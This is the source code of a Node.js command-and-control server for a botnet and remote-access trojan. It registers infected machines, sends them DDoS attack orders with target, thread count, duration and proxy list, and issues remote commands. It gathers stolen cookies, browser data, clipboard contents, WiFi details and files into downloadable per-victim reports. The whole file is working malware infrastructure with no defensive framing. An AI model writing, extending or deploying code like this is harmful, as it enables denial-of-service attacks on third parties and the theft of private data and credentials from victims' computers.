const express = require('express');
const http = require('http');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);

app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));
app.use('/methods', express.static('methods'));

let bots = {};
let pendingCommands = {};
let infoData = {};

setInterval(() => {
    let now = new Date();
    for (let id in bots) {
        if ((now - new Date(bots[id].lastSeen)) > 15000) {
            delete bots[id];
            delete infoData[id];
        }
    }
}, 10000);

app.post('/api/register', (req, res) => {
    const { id, hostname, ip } = req.body;
    for (let oldId in bots) {
        if (bots[oldId].hostname === hostname && oldId !== id) {
            delete bots[oldId];
            delete infoData[oldId];
        }
    }
    bots[id] = {
        id, hostname: hostname || 'Unknown', ip: ip || req.ip,
        online: true, status: 'ONLINE', target: '', method: '',
        cpu: 0, ram: 0, gpu: 'Unknown', cookies: '', lastSeen: new Date()
    };
    res.json({ ok: true });
});

app.post('/api/check', (req, res) => {
    const { id } = req.body;
    if (bots[id]) { bots[id].lastSeen = new Date(); bots[id].online = true; }
    let cmd = pendingCommands['ALL'] || pendingCommands[id] || null;
    if (cmd) { delete pendingCommands['ALL']; delete pendingCommands[id]; }
    res.json(cmd || { action: 'none' });
});

app.post('/api/report', (req, res) => {
    const { id, status, target, method } = req.body;
    if (bots[id]) {
        bots[id].status = status || 'ONLINE';
        bots[id].target = target || '';
        bots[id].method = method || '';
        bots[id].lastSeen = new Date();
    }
    res.json({ ok: true });
});

app.post('/api/reportinfo', (req, res) => {
    const { id, cpu, ram, gpu, cookies, browsers } = req.body;
    if (bots[id]) {
        bots[id].cpu = parseInt(cpu) || 0;
        bots[id].ram = parseInt(ram) || 0;
        bots[id].gpu = gpu || 'Unknown';
        bots[id].cookies = cookies || '';
        bots[id].browsers = browsers || '';
        bots[id].lastSeen = new Date();
    }
    if (!infoData[id]) infoData[id] = {};
    infoData[id].cpu = parseInt(cpu) || 0;
    infoData[id].ram = parseInt(ram) || 0;
    infoData[id].gpu = gpu || 'Unknown';
    infoData[id].cookies = cookies || '';
    infoData[id].browsers = browsers || '';
    infoData[id].time = new Date().toISOString();
    res.json({ ok: true });
});

app.post('/api/attack', (req, res) => {
    const { botId, method, target, threads, duration, proxyFile } = req.body;
    const cmd = { action: 'attack', method, target, threads: parseInt(threads)||100, duration: parseInt(duration)||60, proxyFile: proxyFile||'' };
    if (botId === 'ALL') pendingCommands['ALL'] = cmd;
    else if (botId) pendingCommands[botId] = cmd;
    res.json({ ok: true });
});

app.post('/api/stop', (req, res) => {
    const { botId } = req.body;
    if (botId === 'ALL') pendingCommands['ALL'] = { action: 'stop' };
    else if (botId) pendingCommands[botId] = { action: 'stop' };
    res.json({ ok: true });
});

app.post('/api/getinfo', (req, res) => {
    const { botId } = req.body;
    const cmd = { action: 'getinfo' };
    if (botId === 'ALL') pendingCommands['ALL'] = cmd;
    else if (botId) pendingCommands[botId] = cmd;
    res.json({ ok: true });
});

app.get('/api/downloadinfo/:id', (req, res) => {
    const id = req.params.id;
    const bot = bots[id];
    const info = infoData[id] || {};
    if (!bot) return res.status(404).send('Bot not found');
    let txt = '========================================\n';
    txt += '    BOT INFORMATION REPORT\n';
    txt += '========================================\n\n';
    txt += 'Bot ID:        ' + id + '\n';
    txt += 'Hostname:      ' + (bot.hostname||'N/A') + '\n';
    txt += 'IP Address:    ' + (bot.ip||'N/A') + '\n';
    txt += 'Status:        ' + (bot.status||'N/A') + '\n';
    txt += 'Last Seen:     ' + (bot.lastSeen||'N/A') + '\n\n';
    txt += '--- SYSTEM INFO ---\n';
    txt += 'CPU:           ' + (info.cpu||bot.cpu||0) + '%\n';
    txt += 'RAM:           ' + (info.ram||bot.ram||0) + '%\n';
    txt += 'GPU:           ' + (info.gpu||bot.gpu||'N/A') + '\n\n';
    txt += '--- BROWSER DATA ---\n';
    txt += 'Browsers:      ' + (info.browsers||'N/A') + '\n\n';
    txt += '--- COOKIES ---\n';
    txt += (info.cookies||'No cookies') + '\n\n';
    txt += '--- RAT DATA ---\n';
    txt += 'Clipboard:     ' + (info.rat_clipboard||'N/A') + '\n';
    txt += 'WiFi:          ' + (info.rat_wifi||'N/A') + '\n';
    txt += 'Files:         ' + (info.rat_files||'N/A') + '\n';
    txt += 'System Info:   ' + (info.rat_sysinfo||'N/A') + '\n';
    txt += 'CMD Result:    ' + (info.rat_cmd_result||'N/A') + '\n';
    txt += 'Download:      ' + (info.rat_downloadfile||'N/A') + '\n';
    txt += 'Cookies:       ' + (info.rat_cookies||'N/A') + '\n\n';
    txt += '--- TIMESTAMP ---\n';
    txt += 'Report Time:   ' + (info.time||'N/A') + '\n';
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', 'attachment; filename=bot_' + (bot.hostname||'unknown') + '.txt');
    res.send(txt);
});

app.post('/api/rat', (req, res) => {
    const { botId, action, params } = req.body;
    const cmd = { action: 'rat', ratAction: action, params: params || '' };
    if (botId === 'ALL') pendingCommands['ALL'] = cmd;
    else if (botId) pendingCommands[botId] = cmd;
    res.json({ ok: true });
});

app.post('/api/ratdata', (req, res) => {
    const { id, type, data } = req.body;
    if (!infoData[id]) infoData[id] = {};
    infoData[id]['rat_' + type] = data || '';
    infoData[id].time = new Date().toISOString();
    if (bots[id]) bots[id].lastSeen = new Date();
    res.json({ ok: true });
});

app.get('/api/ratdata/:id/:type', (req, res) => {
    const id = req.params.id;
    const type = 'rat_' + req.params.type;
    const data = infoData[id] ? infoData[id][type] : null;
    res.json({ id, type, data: data || '(Chưa có dữ liệu)' });
});

app.get('/api/bots', (req, res) => {
    let online = {};
    for (let id in bots) if (bots[id].online) online[id] = bots[id];
    res.json(online);
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'panel.html'));
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log('Server running on port ' + PORT));
